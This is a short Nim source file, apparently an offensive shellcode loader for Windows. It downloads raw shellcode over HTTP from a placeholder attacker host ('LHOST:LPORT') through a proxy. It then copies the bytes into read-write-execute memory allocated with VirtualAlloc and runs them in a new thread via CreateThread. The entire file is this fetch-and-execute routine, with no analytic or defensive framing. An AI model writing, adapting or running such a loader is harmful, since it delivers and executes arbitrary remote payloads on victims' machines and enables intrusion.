import httpclient
import winim/lean

var 
    custom_proxy    = newProxy(url="http://PROXY_IP:PORT")
    client          = newHttpClient(proxy=custom_proxy)
    shellcode       = newseq[byte]()
    data            : string
    old_protect     : DWORD = PAGE_READWRITE

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))


proc lets_run_that(): void = 
    data = client.getContent("http://LHOST:LPORT/shellcode")
    client.close()
    shellcode = toByteSeq(data)
    var shellcode_len = cast[SIZE_T](len(shellcode))
    var buffer = VirtualAlloc(nil, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    CopyMemory(buffer, &shellcode[0], shellcode_len);
    VirtualProtect(shellcode[0].addr, shellcode_len, PAGE_EXECUTE_READWRITE, oldProtect.addr)
    var create_thread : HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
    WaitForSingleObject(create_thread,-1)
    CloseHandle(create_thread)


when isMainModule:
    lets_run_that()
